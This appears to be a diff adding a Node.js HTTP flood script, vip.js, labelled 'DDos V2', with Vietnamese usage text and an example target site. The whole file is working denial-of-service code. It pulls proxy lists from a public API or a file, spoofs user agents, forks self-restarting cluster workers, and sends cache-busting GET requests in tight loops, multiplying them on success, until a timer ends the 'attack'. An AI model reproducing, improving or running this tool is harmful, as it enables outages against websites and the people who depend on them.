@@ -1,0 +1,122 @@
+require('events').EventEmitter.defaultMaxListeners = 0;
+const colorize = (...args) => ({
+    black: `\x1b[30m${args.join(' ')}`,
+    red: `\x1b[31m${args.join(' ')}`,
+    green: `\x1b[32m${args.join(' ')}`,
+    yellow: `\x1b[33m${args.join(' ')}`,
+    blue: `\x1b[34m${args.join(' ')}`,
+    magenta: `\x1b[35m${args.join(' ')}`,
+    cyan: `\x1b[36m${args.join(' ')}`,
+    white: `\x1b[37m${args.join(' ')}`,
+    bgBlack: `\x1b[40m${args.join(' ')}\x1b[0m`,
+    bgRed: `\x1b[41m${args.join(' ')}\x1b[0m`,
+    bgGreen: `\x1b[42m${args.join(' ')}\x1b[0m`,
+    bgYellow: `\x1b[43m${args.join(' ')}\x1b[0m`,
+    bgBlue: `\x1b[44m${args.join(' ')}\x1b[0m`,
+    bgMagenta: `\x1b[45m${args.join(' ')}\x1b[0m`,
+    bgCyan: `\x1b[46m${args.join(' ')}\x1b[0m`,
+    bgWhite: `\x1b[47m${args.join(' ')}\x1b[0m`
+})
+const request = require('request'),
+      axios = require('axios'),
+      fs = require('fs'),
+      fakeUa = require('fake-useragent'),
+      cluster = require('cluster');
+      console.clear()
+async function poptto() {
+    if (process.argv.length !== 6) {
+        console.log('ㄒㄩ乃工 - ᗪᗪㄖ丂 v2');
+        console.log(colorize('Cách sử dụng: node vip.js url threads tuancute/off/proxy.txt (1 trong 3)').bgRed);
+        console.log(colorize('VD: node vip.js https://baostar.pro/ 3000 10 tuancute').bgBlue);
+        console.log(colorize('Make By Phan Anh Tuấn (𝗧𝗨𝗕𝗜 - 𝗗𝗗𝗼𝘀 V2)').bgCyan);
+        process.exit(0);
+    }else{
+        const target = process.argv[2];
+        const times = process.argv[3];
+        const threads = process.argv[4];
+        Array.prototype.remove_by_value = function(val) {
+            for (var i = 0; i < this.length; i++) {
+            if (this[i] === val) {
+                this.splice(i, 1);
+                i--;
+            }
+            }
+            return this;
+        }
+        if (process.argv[5] == 'off') {
+            console.log("OFF")
+        } else if (process.argv[5] == 'tuancute'){
+            console.log("PROXY")
+            const proxyscrape = await axios.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all');
+            var proxies = proxyscrape.data.replace(/\r/g, '').split('\n');
+        } else {
+            console.log("PROXY")
+            var proxies = fs.readFileSync(process.argv[5], 'utf-8').replace(/\r/g, '').split('\n');
+        }
+        function run() {
+            if (process.argv[5] !== 'off') {
+                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
+                var proxiedRequest = request.defaults({'proxy': 'http://'+proxy});
+                var config = {
+                    method: 'get',
+                    url: target,
+                    headers: {
+                        'Cache-Control': 'no-cache',
+                        'User-Agent': fakeUa()
+                    }
+                };
+                proxiedRequest(config, function (error, response) {
+                    console.log(response.statusCode, response.statusMessage, `${target}`);                    if (proxies.length == 0) {
+                        process.exit(0);
+                    }
+                    if (response.statusCode >= 200 && response.statusCode <= 226) {
+                        for (let index = 0; index < 100; index++) {
+                            proxiedRequest(config);
+                        }
+                    }else{
+                        proxies = proxies.remove_by_value(proxy)
+                    }
+                });
+            } else {
+                var config = {
+                    method: 'get',
+                    url: target,
+                    headers: {
+                        'Cache-Control': 'no-cache',
+                        'User-Agent': fakeUa()
+                    }
+                };
+                request(config, function (error, response) {
+                    console.log(response.statusCode, 'hi', response.statusMessage, `${target}`);
+                });
+            }
+        }
+        function thread(){
+            setInterval(() => {
+                run();
+            });
+        }
+        async function main(){
+                if (cluster.isMaster) {
+                        for (let i = 0; i < threads; i++) {
+                            cluster.fork();
+                        }
+                    cluster.on('exit', function(){
+                        cluster.fork();
+                    });
+                } else {
+                    thread();
+                }
+        }
+        main();
+        setTimeout(() => {
+            console.log('Attack ended.');
+            process.exit(0)
+        }, times * 1000);
+    }
+}
+process.on('uncaughtException', function (err) {
+});
+process.on('unhandledRejection', function (err) {
+});
+poptto();
